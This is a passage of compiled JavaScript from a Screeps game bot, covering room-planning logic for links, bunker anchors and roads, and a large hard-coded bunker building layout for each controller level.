        const origin = (this.colony.storage || this.colony.terminal || _.first(this.colony.spawns) || this.colony).pos;
        const farthestSources = _.sortBy(this.colony.room.sources, source => -1 * Pathing.distance(origin, source.pos));
        for (const source of farthestSources) {
            const sourceLink = source.pos.findClosestByLimitedRange(linksEtAl, 2);
            if (!sourceLink)
                return source.pos;
        }
    }
    /**
     * Builds links as they become available. UpgradeSite gets link first, then miningSites by distance.
     */
    buildNeededLinks() {
        const numLinks = this.colony.links.length +
            _.filter(this.colony.constructionSites, site => site.structureType == STRUCTURE_LINK).length;
        const numLinksAllowed = CONTROLLER_STRUCTURES.link[this.colony.level];
        if (numLinksAllowed > numLinks &&
            (this.colony.bunker || (this.colony.hatchery && this.colony.hatchery.link)) &&
            this.colony.commandCenter && this.colony.commandCenter.link) {
            const anchor = this.nextNeededLinkAnchor();
            if (!anchor) {
                return;
            }
            const linkPos = this.calculateLinkPos(anchor);
            if (!linkPos) {
                log.warning(`Could not calculate link position for anchor at ${anchor.print}!`);
                return;
            }
            linkPos.createConstructionSite(STRUCTURE_LINK);
        }
    }
    /**
     * Quick lookup for if a road should be in this position. Roads returning false won't be maintained.
     */
    roadShouldBeHere(pos) {
        return this.roadPlanner.roadShouldBeHere(pos);
    }
    init() {
        if (this.active && getAutonomyLevel() == Autonomy.Automatic) {
            let bunkerAnchor;
            if (this.colony.spawns.length > 0) { // in case of very first spawn
                const lowerRightSpawn = maxBy(this.colony.spawns, s => 50 * s.pos.y + s.pos.x);
                const spawnPos = lowerRightSpawn.pos;
                bunkerAnchor = new RoomPosition(spawnPos.x - 4, spawnPos.y, spawnPos.roomName);
            }
            else {
                const expansionData = this.colony.room.memory["e" /* EXPANSION_DATA */];
                if (expansionData) {
                    bunkerAnchor = derefCoords(expansionData.bunkerAnchor, this.colony.room.name);
                }
                else {
                    log.error(`Cannot determine anchor! No spawns or expansionData.bunkerAnchor!`);
                    return;
                }
            }
            this.addComponent('bunker', bunkerAnchor);
        }
        this.barrierPlanner.init();
        this.roadPlanner.init();
    }
    shouldRecheck(offset = 0) {
        if (Game.time == (this.memory.recheckStructuresAt || Infinity) + offset) {
            return true;
        }
        else if (this.colony.level == 8) {
            return Game.time % (2 * RoomPlanner_1.settings.siteCheckFrequency) == 2 * this.colony.id + offset;
        }
        else {
            return Game.time % RoomPlanner_1.settings.siteCheckFrequency == 2 * this.colony.id + offset;
        }
    }
    run() {
        if (this.active) {
            this.make();
            this.visuals();
        }
        else {
            // Build missing structures from the layout
            if (this.shouldRecheck()) {
                this.demolishMisplacedStructures();
            }
            else if (this.shouldRecheck(1)) {
                this.buildMissingStructures();
            }
            // Build missing links as needed
            if (Game.time % RoomPlanner_1.settings.linkCheckFrequency == 3) {
                this.buildNeededLinks();
            }
        }
        // Run the barrier planner
        this.barrierPlanner.run();
        // Run the road planner
        this.roadPlanner.run();
        if (this.active && getAutonomyLevel() == Autonomy.Automatic) {
            if (this.placements.bunker) {
                this.finalize();
            }
            else {
                log.warning(`No bunker placement!`);
            }
        }
    }
    visuals() {
        // Draw the map
        if (getAutonomyLevel() < Autonomy.Automatic) {
            const expansionData = this.colony.room.memory["e" /* EXPANSION_DATA */];
            if (expansionData) {
                const bunkerPos = derefCoords(expansionData.bunkerAnchor, this.colony.room.name);
                if (bunkerPos) {
                    Visualizer.drawLayout(bunkerLayout, bunkerPos, { opacity: 0.2 });
                }
            }
        }
        Visualizer.drawStructureMap(this.map);
    }
};
RoomPlanner.settings = {
    recheckAfter: 50,
    siteCheckFrequency: onPublicServer() ? 300 : 100,
    linkCheckFrequency: 100,
    maxSitesPerColony: onPublicServer() ? 10 : 25,
    maxDismantleCount: 5,
};
RoomPlanner = RoomPlanner_1 = __decorate([
    profile
], RoomPlanner);

/* tslint:disable */
const BUNKER_RADIUS = 6;
const bunkerLayout = {
    data: {
        anchor: { 'x': 25, 'y': 25 }
    },
    1: {
        'name': 'bunkerCore',
        'shard': 'shard2',
        'rcl': '1',
        'buildings': {
            'spawn': { 'pos': [{ 'x': 29, 'y': 25 }] }
        }
    },
    2: {
        'name': 'bunkerCore',
        'shard': 'shard2',
        'rcl': '2',
        'buildings': {
            'extension': {
                'pos': [{ 'x': 28, 'y': 26 }, { 'x': 28, 'y': 27 }, { 'x': 27, 'y': 27 }, {
                        'x': 27,
                        'y': 28
                    }, { 'x': 29, 'y': 26 }]
            },
            'spawn': { 'pos': [{ 'x': 29, 'y': 25 }] },
            'container': { 'pos': [{ 'x': 27, 'y': 30 }] }
        }
    },
    3: {
        'name': 'bunkerCore',
        'shard': 'shard2',
        'rcl': '3',
        'buildings': {
            'tower': { 'pos': [{ 'x': 25, 'y': 26 }] },
            'extension': {
                'pos': [{ 'x': 28, 'y': 26 }, { 'x': 29, 'y': 27 }, { 'x': 28, 'y': 27 }, {
                        'x': 27,
                        'y': 27
                    }, { 'x': 27, 'y': 28 }, { 'x': 28, 'y': 28 }, { 'x': 29, 'y': 28 }, { 'x': 28, 'y': 29 }, {
                        'x': 27,
                        'y': 29
                    }, { 'x': 29, 'y': 26 }]
            },
            'spawn': { 'pos': [{ 'x': 29, 'y': 25 }] },
            'container': { 'pos': [{ 'x': 27, 'y': 30 }] }
        }
    },
    4: {
        'name': 'bunkerCore',
        'shard': 'shard2',
        'rcl': '4',
        'buildings': {
            'storage': { 'pos': [{ 'x': 24, 'y': 25 }] },
            'terminal': { 'pos': [] },
            'nuker': { 'pos': [] },
            'tower': { 'pos': [{ 'x': 25, 'y': 26 }] },
            'powerSpawn': { 'pos': [] },
            'link': { 'pos': [] },
            'road': {
                'pos': [{ 'x': 24, 'y': 23 }, { 'x': 25, 'y': 22 }, { 'x': 26, 'y': 23 }, {
                        'x': 27,
                        'y': 24
                    }, { 'x': 28, 'y': 25 }, { 'x': 27, 'y': 26 }, { 'x': 26, 'y': 27 }, { 'x': 25, 'y': 28 }, {
                        'x': 24,
                        'y': 27
                    }, { 'x': 23, 'y': 26 }, { 'x': 22, 'y': 25 }, { 'x': 23, 'y': 24 }, { 'x': 28, 'y': 20 }, {
                        'x': 30,
                        'y': 22
                    }, { 'x': 24, 'y': 21 }, { 'x': 30, 'y': 28 }, { 'x': 28, 'y': 30 }, { 'x': 26, 'y': 29 }, {
                        'x': 20,
                        'y': 22
                    }, { 'x': 22, 'y': 20 }, { 'x': 20, 'y': 28 }, { 'x': 22, 'y': 30 }, { 'x': 24, 'y': 19 }, {
                        'x': 26,
                        'y': 19
                    }, { 'x': 27, 'y': 19 }, { 'x': 31, 'y': 23 }, { 'x': 31, 'y': 24 }, { 'x': 31, 'y': 25 }, {
                        'x': 31,
                        'y': 26
                    }, { 'x': 31, 'y': 27 }, { 'x': 27, 'y': 31 }, { 'x': 27, 'y': 31 }, { 'x': 26, 'y': 31 }, {
                        'x': 24,
                        'y': 31
                    }, { 'x': 23, 'y': 31 }, { 'x': 19, 'y': 27 }, { 'x': 19, 'y': 26 }, { 'x': 19, 'y': 25 }, {
                        'x': 19,
                        'y': 24
                    }, { 'x': 25, 'y': 19 }, { 'x': 19, 'y': 23 }, { 'x': 25, 'y': 31 }, { 'x': 23, 'y': 19 }, {
                        'x': 29,
                        'y': 21
                    }, { 'x': 21, 'y': 21 }, { 'x': 21, 'y': 29 }, { 'x': 29, 'y': 29 }, { 'x': 21, 'y': 26 }, {
                        'x': 29,
                        'y': 24
                    }, { 'x': 30, 'y': 23 }, { 'x': 20, 'y': 27 }, { 'x': 23, 'y': 25 }, { 'x': 27, 'y': 25 }, {
                        'x': 23,
                        'y': 20
                    }, { 'x': 24, 'y': 28 }, { 'x': 23, 'y': 29 }, { 'x': 23, 'y': 30 }, { 'x': 27, 'y': 30 }]
            },
            'observer': { 'pos': [] },
            'lab': { 'pos': [] },
            'extension': {
                'pos': [{ 'x': 30, 'y': 24 }, { 'x': 30, 'y': 25 }, { 'x': 30, 'y': 26 }, {
                        'x': 28,
                        'y': 26
                    }, { 'x': 29, 'y': 27 }, { 'x': 28, 'y': 27 }, { 'x': 27, 'y': 27 }, { 'x': 27, 'y': 28 }, {
                        'x': 28,
                        'y': 28
                    }, { 'x': 29, 'y': 28 }, { 'x': 28, 'y': 29 }, { 'x': 27, 'y': 29 }, { 'x': 26, 'y': 28 }, {
                        'x': 24,
                        'y': 30
                    }, { 'x': 25, 'y': 30 }, { 'x': 26, 'y': 30 }, { 'x': 29, 'y': 26 }, { 'x': 24, 'y': 29 }, {
                        'x': 30,
                        'y': 27
                    }, { 'x': 25, 'y': 29 }]
            },
            'spawn': { 'pos': [{ 'x': 29, 'y': 25 }] },
            'container': { 'pos': [{ 'x': 27, 'y': 30 }] }
        }
    },
    5: {
        'name': 'bunkerCore',
        'shard': 'shard2',
        'rcl': '5',
        'buildings': {
            'storage': { 'pos': [{ 'x': 24, 'y': 25 }] },
            'terminal': { 'pos': [] },
            'nuker': { 'pos': [] },
            'tower': { 'pos': [{ 'x': 25, 'y': 24 }, { 'x': 25, 'y': 26 }] },
            'powerSpawn': { 'pos': [] },
            'link': { 'pos': [{ 'x': 26, 'y': 26 }] },
            'road': {
                'pos': [{ 'x': 24, 'y': 23 }, { 'x': 25, 'y': 22 }, { 'x': 26, 'y': 23 }, {
                        'x': 27,
                        'y': 24
                    }, { 'x': 28, 'y': 25 }, { 'x': 27, 'y': 26 }, { 'x': 26, 'y': 27 }, { 'x': 25, 'y': 28 }, {
                        'x': 24,
                        'y': 27
                    }, { 'x': 23, 'y': 26 }, { 'x': 22, 'y': 25 }, { 'x': 23, 'y': 24 }, { 'x': 28, 'y': 20 }, {
                        'x': 30,
                        'y': 22
                    }, { 'x': 24, 'y': 21 }, { 'x': 30, 'y': 28 }, { 'x': 28, 'y': 30 }, { 'x': 26, 'y': 29 }, {
                        'x': 20,
                        'y': 22
                    }, { 'x': 22, 'y': 20 }, { 'x': 20, 'y': 28 }, { 'x': 22, 'y': 30 }, { 'x': 24, 'y': 19 }, {
                        'x': 26,
                        'y': 19
                    }, { 'x': 27, 'y': 19 }, { 'x': 31, 'y': 23 }, { 'x': 31, 'y': 24 }, { 'x': 31, 'y': 25 }, {
                        'x': 31,
                        'y': 26
                    }, { 'x': 31, 'y': 27 }, { 'x': 27, 'y': 31 }, { 'x': 27, 'y': 31 }, { 'x': 26, 'y': 31 }, {
                        'x': 24,
                        'y': 31
                    }, { 'x': 23, 'y': 31 }, { 'x': 19, 'y': 27 }, { 'x': 19, 'y': 26 }, { 'x': 19, 'y': 25 }, {
                        'x': 19,
                        'y': 24
                    }, { 'x': 25, 'y': 19 }, { 'x': 19, 'y': 23 }, { 'x': 25, 'y': 31 }, { 'x': 23, 'y': 19 }, {
                        'x': 29,
                        'y': 21
                    }, { 'x': 21, 'y': 21 }, { 'x': 21, 'y': 29 }, { 'x': 29, 'y': 29 }, { 'x': 21, 'y': 26 }, {
                        'x': 29,
                        'y': 24
                    }, { 'x': 30, 'y': 23 }, { 'x': 20, 'y': 27 }, { 'x': 23, 'y': 25 }, { 'x': 27, 'y': 25 }, {
                        'x': 23,
                        'y': 20
                    }, { 'x': 27, 'y': 30 }]
            },
            'observer': { 'pos': [] },
            'lab': { 'pos': [] },
            'extension': {
                'pos': [{ 'x': 30, 'y': 24 }, { 'x': 30, 'y': 25 }, { 'x': 30, 'y': 26 }, {
                        'x': 28,
                        'y': 26
                    }, { 'x': 29, 'y': 27 }, { 'x': 28, 'y': 27 }, { 'x': 27, 'y': 27 }, { 'x': 27, 'y': 28 }, {
                        'x': 28,
                        'y': 28
                    }, { 'x': 29, 'y': 28 }, { 'x': 28, 'y': 29 }, { 'x': 27, 'y': 29 }, { 'x': 26, 'y': 28 }, {
                        'x': 23,
                        'y': 27
                    }, { 'x': 24, 'y': 28 }, { 'x': 23, 'y': 28 }, { 'x': 22, 'y': 27 }, { 'x': 21, 'y': 27 }, {
                        'x': 22,
                        'y': 28
                    }, { 'x': 23, 'y': 29 }, { 'x': 21, 'y': 28 }, { 'x': 24, 'y': 30 }, { 'x': 25, 'y': 30 }, {
                        'x': 26,
                        'y': 30
                    }, { 'x': 29, 'y': 26 }, { 'x': 24, 'y': 29 }, { 'x': 23, 'y': 30 }, { 'x': 30, 'y': 27 }, {
                        'x': 25,
                        'y': 29
                    }, { 'x': 22, 'y': 29 }]
            },
            'spawn': { 'pos': [{ 'x': 29, 'y': 25 }] },
            'container': { 'pos': [{ 'x': 27, 'y': 30 }] }
        }
    },
    6: {
        'name': 'bunkerCore',
        'shard': 'shard2',
        'rcl': '6',
        'buildings': {
            'storage': { 'pos': [{ 'x': 24, 'y': 25 }] },
            'terminal': { 'pos': [{ 'x': 26, 'y': 25 }] },
            'nuker': { 'pos': [] },
            'tower': { 'pos': [{ 'x': 25, 'y': 24 }, { 'x': 25, 'y': 26 }] },
            'powerSpawn': { 'pos': [] },
            'link': { 'pos': [{ 'x': 26, 'y': 26 }] },
            'road': {
                'pos': [{ 'x': 24, 'y': 23 }, { 'x': 25, 'y': 22 }, { 'x': 26, 'y': 23 }, {
                        'x': 27,
                        'y': 24
                    }, { 'x': 28, 'y': 25 }, { 'x': 27, 'y': 26 }, { 'x': 26, 'y': 27 }, { 'x': 25, 'y': 28 }, {
                        'x': 24,
                        'y': 27
                    }, { 'x': 23, 'y': 26 }, { 'x': 22, 'y': 25 }, { 'x': 23, 'y': 24 }, { 'x': 28, 'y': 20 }, {
                        'x': 30,
                        'y': 22
                    }, { 'x': 24, 'y': 21 }, { 'x': 30, 'y': 28 }, { 'x': 28, 'y': 30 }, { 'x': 26, 'y': 29 }, {
                        'x': 20,
                        'y': 22
                    }, { 'x': 22, 'y': 20 }, { 'x': 20, 'y': 28 }, { 'x': 22, 'y': 30 }, { 'x': 24, 'y': 19 }, {
                        'x': 26,
                        'y': 19
                    }, { 'x': 27, 'y': 19 }, { 'x': 31, 'y': 23 }, { 'x': 31, 'y': 24 }, { 'x': 31, 'y': 25 }, {
                        'x': 31,
                        'y': 26
                    }, { 'x': 31, 'y': 27 }, { 'x': 27, 'y': 31 }, { 'x': 27, 'y': 31 }, { 'x': 26, 'y': 31 }, {
                        'x': 24,
                        'y': 31
                    }, { 'x': 23, 'y': 31 }, { 'x': 19, 'y': 27 }, { 'x': 19, 'y': 26 }, { 'x': 19, 'y': 25 }, {
                        'x': 19,
                        'y': 24
                    }, { 'x': 25, 'y': 19 }, { 'x': 19, 'y': 23 }, { 'x': 25, 'y': 31 }, { 'x': 23, 'y': 19 }, {
                        'x': 29,
                        'y': 21
                    }, { 'x': 21, 'y': 21 }, { 'x': 21, 'y': 29 }, { 'x': 29, 'y': 29 }, { 'x': 21, 'y': 26 }, {
                        'x': 29,
                        'y': 24
                    }, { 'x': 30, 'y': 23 }, { 'x': 20, 'y': 27 }, { 'x': 23, 'y': 25 }, { 'x': 27, 'y': 25 }, {
                        'x': 22,
                        'y': 22
                    }, { 'x': 23, 'y': 23 }, { 'x': 23, 'y': 20 }, { 'x': 27, 'y': 30 }]
            },
            'observer': { 'pos': [] },
            'lab': { 'pos': [{ 'x': 27, 'y': 23 }, { 'x': 28, 'y': 24 }, { 'x': 28, 'y': 23 }] },
            'extension': {
                'pos': [{ 'x': 22, 'y': 24 }, { 'x': 22, 'y': 23 }, { 'x': 21, 'y': 23 }, {
                        'x': 30,
                        'y': 24
                    }, { 'x': 30, 'y': 25 }, { 'x': 30, 'y': 26 }, { 'x': 20, 'y': 24 }, { 'x': 20, 'y': 25 }, {
                        'x': 20,
                        'y': 26
                    }, { 'x': 21, 'y': 22 }, { 'x': 28, 'y': 26 }, { 'x': 29, 'y': 27 }, { 'x': 28, 'y': 27 }, {
                        'x': 27,
                        'y': 27
                    }, { 'x': 27, 'y': 28 }, { 'x': 28, 'y': 28 }, { 'x': 29, 'y': 28 }, { 'x': 28, 'y': 29 }, {
                        'x': 27,
                        'y': 29
                    }, { 'x': 26, 'y': 28 }, { 'x': 22, 'y': 26 }, { 'x': 23, 'y': 27 }, { 'x': 24, 'y': 28 }, {
                        'x': 23,
                        'y': 28
                    }, { 'x': 22, 'y': 27 }, { 'x': 21, 'y': 27 }, { 'x': 22, 'y': 28 }, { 'x': 23, 'y': 29 }, {
                        'x': 22,
                        'y': 29
                    }, { 'x': 21, 'y': 28 }, { 'x': 24, 'y': 30 }, { 'x': 25, 'y': 30 }, { 'x': 26, 'y': 30 }, {
                        'x': 29,
                        'y': 26
                    }, { 'x': 21, 'y': 24 }, { 'x': 24, 'y': 29 }, { 'x': 23, 'y': 30 }, { 'x': 20, 'y': 23 }, {
                        'x': 30,
                        'y': 27
                    }, { 'x': 25, 'y': 29 }]
            },
            'spawn': { 'pos': [{ 'x': 29, 'y': 25 }] },
            'container': { 'pos': [{ 'x': 27, 'y': 30 }] }
        }
    },
    7: {
        'name': 'bunkerCore',
        'shard': 'shard2',
        'rcl': '7',
        'buildings': {
            'storage': { 'pos': [{ 'x': 24, 'y': 25 }] },
            'terminal': { 'pos': [{ 'x': 26, 'y': 25 }] },
            'nuker': { 'pos': [] },
            'tower': { 'pos': [{ 'x': 25, 'y': 24 }, { 'x': 25, 'y': 26 }, { 'x': 25, 'y': 23 }] },
            'powerSpawn': { 'pos': [] },
            'link': { 'pos': [{ 'x': 26, 'y': 26 }] },
            'road': {
                'pos': [{ 'x': 24, 'y': 23 }, { 'x': 25, 'y': 22 }, { 'x': 26, 'y': 23 }, {
                        'x': 27,
                        'y': 24
                    }, { 'x': 28, 'y': 25 }, { 'x': 27, 'y': 26 }, { 'x': 26, 'y': 27 }, { 'x': 25, 'y': 28 }, {
                        'x': 24,
                        'y': 27
                    }, { 'x': 23, 'y': 26 }, { 'x': 22, 'y': 25 }, { 'x': 23, 'y': 24 }, { 'x': 28, 'y': 20 }, {
                        'x': 30,
                        'y': 22
                    }, { 'x': 24, 'y': 21 }, { 'x': 30, 'y': 28 }, { 'x': 28, 'y': 30 }, { 'x': 26, 'y': 29 }, {
                        'x': 20,
                        'y': 22
                    }, { 'x': 22, 'y': 20 }, { 'x': 20, 'y': 28 }, { 'x': 22, 'y': 30 }, { 'x': 24, 'y': 19 }, {
                        'x': 26,
                        'y': 19
                    }, { 'x': 27, 'y': 19 }, { 'x': 31, 'y': 23 }, { 'x': 31, 'y': 24 }, { 'x': 31, 'y': 25 }, {
                        'x': 31,
                        'y': 26
                    }, { 'x': 31, 'y': 27 }, { 'x': 27, 'y': 31 }, { 'x': 27, 'y': 31 }, { 'x': 26, 'y': 31 }, {
                        'x': 24,
                        'y': 31
                    }, { 'x': 23, 'y': 31 }, { 'x': 19, 'y': 27 }, { 'x': 19, 'y': 26 }, { 'x': 19, 'y': 25 }, {
                        'x': 19,
                        'y': 24
                    }, { 'x': 25, 'y': 19 }, { 'x': 19, 'y': 23 }, { 'x': 25, 'y': 31 }, { 'x': 23, 'y': 19 }, {
                        'x': 29,
                        'y': 21
                    }, { 'x': 21, 'y': 21 }, { 'x': 21, 'y': 29 }, { 'x': 29, 'y': 29 }, { 'x': 21, 'y': 26 }, {
                        'x': 29,
                        'y': 24
                    }, { 'x': 30, 'y': 23 }, { 'x': 20, 'y': 27 }, { 'x': 27, 'y': 22 }, { 'x': 28, 'y': 21 }, {
                        'x': 23,
                        'y': 25
                    }, { 'x': 27, 'y': 25 }, { 'x': 27, 'y': 30 }, { 'x': 23, 'y': 20 }]
            },
            'observer': { 'pos': [] },
            'lab': {
                'pos': [{ 'x': 27, 'y': 23 }, { 'x': 28, 'y': 24 }, { 'x': 28, 'y': 22 }, {
                        'x': 28,
                        'y': 23
                    }, { 'x': 29, 'y': 23 }, { 'x': 29, 'y': 22 }]
            },
            'extension': {
                'pos': [{ 'x': 24, 'y': 22 }, { 'x': 23, 'y': 23 }, { 'x': 22, 'y': 24 }, {
                        'x': 22,
                        'y': 23
                    }, { 'x': 23, 'y': 22 }, { 'x': 23, 'y': 21 }, { 'x': 22, 'y': 22 }, { 'x': 21, 'y': 23 }, {
                        'x': 25,
                        'y': 20
                    }, { 'x': 26, 'y': 20 }, { 'x': 30, 'y': 24 }, { 'x': 30, 'y': 25 }, { 'x': 30, 'y': 26 }, {
                        'x': 20,
                        'y': 24
                    }, { 'x': 20, 'y': 25 }, { 'x': 20, 'y': 26 }, { 'x': 22, 'y': 21 }, { 'x': 21, 'y': 22 }, {
                        'x': 28,
                        'y': 26
                    }, { 'x': 29, 'y': 27 }, { 'x': 28, 'y': 27 }, { 'x': 27, 'y': 27 }, { 'x': 27, 'y': 28 }, {
                        'x': 28,
                        'y': 28
                    }, { 'x': 29, 'y': 28 }, { 'x': 28, 'y': 29 }, { 'x': 27, 'y': 29 }, { 'x': 26, 'y': 28 }, {
                        'x': 22,
                        'y': 26
                    }, { 'x': 23, 'y': 27 }, { 'x': 24, 'y': 28 }, { 'x': 23, 'y': 28 }, { 'x': 22, 'y': 27 }, {
                        'x': 21,
                        'y': 27
                    }, { 'x': 22, 'y': 28 }, { 'x': 23, 'y': 29 }, { 'x': 22, 'y': 29 }, { 'x': 21, 'y': 28 }, {
                        'x': 24,
                        'y': 30
                    }, { 'x': 25, 'y': 30 }, { 'x': 26, 'y': 30 }, { 'x': 29, 'y': 26 }, { 'x': 21, 'y': 24 }, {
                        'x': 26,
                        'y': 21
                    }, { 'x': 24, 'y': 29 }, { 'x': 23, 'y': 30 }, { 'x': 20, 'y': 23 }, { 'x': 27, 'y': 20 }, {
                        'x': 30,
                        'y': 27
                    }, { 'x': 25, 'y': 29 }]
            },
            'spawn': { 'pos': [{ 'x': 29, 'y': 25 }, { 'x': 26, 'y': 24 }] },
            'container': { 'pos': [{ 'x': 27, 'y': 30 }, { 'x': 23, 'y': 20 }] }
        }
    },
    8: {
        'name': 'bunkerCore',
        'shard': 'shard2',
        'rcl': '8',
        'buildings': {
            'storage': { 'pos': [{ 'x': 24, 'y': 25 }] },
            'terminal': { 'pos': [{ 'x': 26, 'y': 25 }] },
            'nuker': { 'pos': [{ 'x': 24, 'y': 24 }] },
            'tower': {
                'pos': [{ 'x': 27, 'y': 25 }, { 'x': 23, 'y': 25 }, { 'x': 25, 'y': 27 }, {
                        'x': 25,
                        'y': 23
                    }, { 'x': 25, 'y': 24 }, { 'x': 25, 'y': 26 }]
            },
            'powerSpawn': { 'pos': [{ 'x': 24, 'y': 26 }] },
            'link': { 'pos': [{ 'x': 26, 'y': 26 }] },
            'road': {
                'pos': [{ 'x': 24, 'y': 23 }, { 'x': 25, 'y': 22 }, { 'x': 26, 'y': 23 }, {
                        'x': 27,
                        'y': 24
                    }, { 'x': 28, 'y': 25 }, { 'x': 27, 'y': 26 }, { 'x': 26, 'y': 27 }, { 'x': 25, 'y': 28 }, {
                        'x': 24,
                        'y': 27
                    }, { 'x': 23, 'y': 26 }, { 'x': 22, 'y': 25 }, { 'x': 23, 'y': 24 }, { 'x': 28, 'y': 20 }, {
                        'x': 30,
                        'y': 22
                    }, { 'x': 24, 'y': 21 }, { 'x': 30, 'y': 28 }, { 'x': 28, 'y': 30 }, { 'x': 26, 'y': 29 }, {
                        'x': 20,
                        'y': 22
                    }, { 'x': 22, 'y': 20 }, { 'x': 20, 'y': 28 }, { 'x': 22, 'y': 30 }, { 'x': 24, 'y': 19 }, {
                        'x': 26,
                        'y': 19
                    }, { 'x': 27, 'y': 19 }, { 'x': 31, 'y': 23 }, { 'x': 31, 'y': 24 }, { 'x': 31, 'y': 25 }, {
                        'x': 31,
                        'y': 26
                    }, { 'x': 31, 'y': 27 }, { 'x': 27, 'y': 31 }, { 'x': 27, 'y': 31 }, { 'x': 26, 'y': 31 }, {
                        'x': 24,
                        'y': 31
                    }, { 'x': 23, 'y': 31 }, { 'x': 19, 'y': 27 }, { 'x': 19, 'y': 26 }, { 'x': 19, 'y': 25 }, {
                        'x': 19,
                        'y': 24
                    }, { 'x': 25, 'y': 19 }, { 'x': 19, 'y': 23 }, { 'x': 25, 'y': 31 }, { 'x': 23, 'y': 19 }, {
                        'x': 29,
                        'y': 21
                    }, { 'x': 21, 'y': 21 }, { 'x': 21, 'y': 29 }, { 'x': 29, 'y': 29 }, { 'x': 21, 'y': 26 }, {
                        'x': 29,
                        'y': 24
                    }, { 'x': 30, 'y': 23 }, { 'x': 20, 'y': 27 }, { 'x': 27, 'y': 30 }, { 'x': 23, 'y': 20 }]
            },
            'observer': { 'pos': [{ 'x': 21, 'y': 25 }] },
            'lab': {
                'pos': [{ 'x': 26, 'y': 22 }, { 'x': 27, 'y': 23 }, { 'x': 28, 'y': 24 }, {
                        'x': 27,
                        'y': 22
                    }, { 'x': 27, 'y': 21 }, { 'x': 28, 'y': 22 }, { 'x': 28, 'y': 23 }, { 'x': 29, 'y': 23 }, {
                        'x': 28,
                        'y': 21
                    }, { 'x': 29, 'y': 22 }]
            },
            'extension': {
                'pos': [{ 'x': 24, 'y': 22 }, { 'x': 23, 'y': 23 }, { 'x': 22, 'y': 24 }, {
                        'x': 22,
                        'y': 23
                    }, { 'x': 23, 'y': 22 }, { 'x': 23, 'y': 21 }, { 'x': 22, 'y': 22 }, { 'x': 21, 'y': 23 }, {
                        'x': 24,
                        'y': 20
                    }, { 'x': 25, 'y': 20 }, { 'x': 26, 'y': 20 }, { 'x': 30, 'y': 24 }, { 'x': 30, 'y': 25 }, {
                        'x': 30,
                        'y': 26
                    }, { 'x': 20, 'y': 24 }, { 'x': 20, 'y': 25 }, { 'x': 20, 'y': 26 }, { 'x': 22, 'y': 21 }, {
                        'x': 21,
                        'y': 22
                    }, { 'x': 28, 'y': 26 }, { 'x': 29, 'y': 27 }, { 'x': 28, 'y': 27 }, { 'x': 27, 'y': 27 }, {
                        'x': 27,
                        'y': 28
                    }, { 'x': 28, 'y': 28 }, { 'x': 29, 'y': 28 }, { 'x': 28, 'y': 29 }, { 'x': 27, 'y': 29 }, {
                        'x': 26,
                        'y': 28
                    }, { 'x': 22, 'y': 26 }, { 'x': 23, 'y': 27 }, { 'x': 24, 'y': 28 }, { 'x': 23, 'y': 28 }, {
                        'x': 22,
                        'y': 27
                    }, { 'x': 21, 'y': 27 }, { 'x': 22, 'y': 28 }, { 'x': 23, 'y': 29 }, { 'x': 22, 'y': 29 }, {
                        'x': 21,
                        'y': 28
                    }, { 'x': 24, 'y': 30 }, { 'x': 25, 'y': 30 }, { 'x': 26, 'y': 30 }, { 'x': 29, 'y': 26 }, {
                        'x': 21,
                        'y': 24
                    }, { 'x': 26, 'y': 21 }, { 'x': 24, 'y': 29 }, { 'x': 23, 'y': 30 }, { 'x': 20, 'y': 23 }, {
                        'x': 27,
                        'y': 20
                    }, { 'x': 30, 'y': 27 }, { 'x': 25, 'y': 29 }]
            },
            'spawn': { 'pos': [{ 'x': 29, 'y': 25 }, { 'x': 26, 'y': 24 }, { 'x': 25, 'y': 21 }] },
            'container': { 'pos': [{ 'x': 27, 'y': 30 }, { 'x': 23, 'y': 20 }] }
        }
    }
};
let _allBunkerCoords = {};
for (let rcl of [1, 2, 3, 4, 5, 6, 7, 8]) {
    if (bunkerLayout[rcl].buildings) {
        _allBunkerCoords[rcl] = getAllStructureCoordsFromLayout(bunkerLayout, rcl);
    }
    if (rcl == 7 || rcl == 8) { // add center tile for advanced bunkers
        _allBunkerCoords[rcl].push(bunkerLayout.data.anchor);
    }
}
const allBunkerCoords = _allBunkerCoords;
const bunkerCoordLookup = _.mapValues(_allBunkerCoords, (coordArr) => _.zipObject(_.map(coordArr, c => [coordName(c), true])));
// Fast function for checking if a position is inside the bunker
function insideBunkerBounds(pos, colony) {
    if (colony.roomPlanner.memory.bunkerData && colony.roomPlanner.memory.bunkerData.anchor) {
        const dx = bunkerLayout.data.anchor.x - colony.roomPlanner.memory.bunkerData.anchor.x;
        const dy = bunkerLayout.data.anchor.y - colony.roomPlanner.memory.bunkerData.anchor.y;
        const coord = { x: pos.x + dx, y: pos.y + dy };
        return (!!bunkerCoordLookup[colony.level][coordName(coord)]);
    }
    return false;
}
function getPosFromBunkerCoord(coord, colony) {
    if (colony.roomPlanner.memory.bunkerData && colony.roomPlanner.memory.bunkerData.anchor) {
        let dx = colony.roomPlanner.memory.bunkerData.anchor.x - bunkerLayout.data.anchor.x;
        let dy = colony.roomPlanner.memory.bunkerData.anchor.y - bunkerLayout.data.anchor.y;
        return new RoomPosition(coord.x + dx, coord.y + dy, colony.room.name);
    }
    console.log('getPosFromBunkerCoord: shouldn\'t reach here! Unprotected call from non-bunker?');
    return new RoomPosition(-1, -1, 'invalid');
}
// Spots where queens can sit to be renewed when idle
const bunkerChargingSpots = [{ 'x': 29, 'y': 24 }, { 'x': 24, 'y': 21 }];
// Efficient, hard-coded order in which to refill extensions, spawns, labs, and towers
const quadrantFillOrder = {
    lowerRight: [{ 'x': 30, 'y': 24 }, { 'x': 30, 'y': 25 }, { 'x': 29, 'y': 25 }, { 'x': 29, 'y': 26 }, { 'x': 28, 'y': 26 }, {
            'x': 27,
            'y': 25
        }, { 'x': 28, 'y': 27 }, { 'x': 27, 'y': 27 }, { 'x': 27, 'y': 28 }, { 'x': 26, 'y': 28 }, { 'x': 27, 'y': 29 }, {
            'x': 28,
            'y': 29
        }, { 'x': 28, 'y': 28 }, { 'x': 29, 'y': 28 }, { 'x': 29, 'y': 27 }, { 'x': 30, 'y': 27 }, { 'x': 30, 'y': 26 }],
    lowerLeft: [{ 'x': 22, 'y': 26 }, { 'x': 22, 'y': 27 }, { 'x': 23, 'y': 27 }, { 'x': 23, 'y': 28 }, {
            'x': 24,
            'y': 28
        }, { 'x': 25, 'y': 27 }, { 'x': 24, 'y': 29 }, { 'x': 25, 'y': 29 }, { 'x': 25, 'y': 30 }, { 'x': 26, 'y': 30 }, {
            'x': 24,
            'y': 30
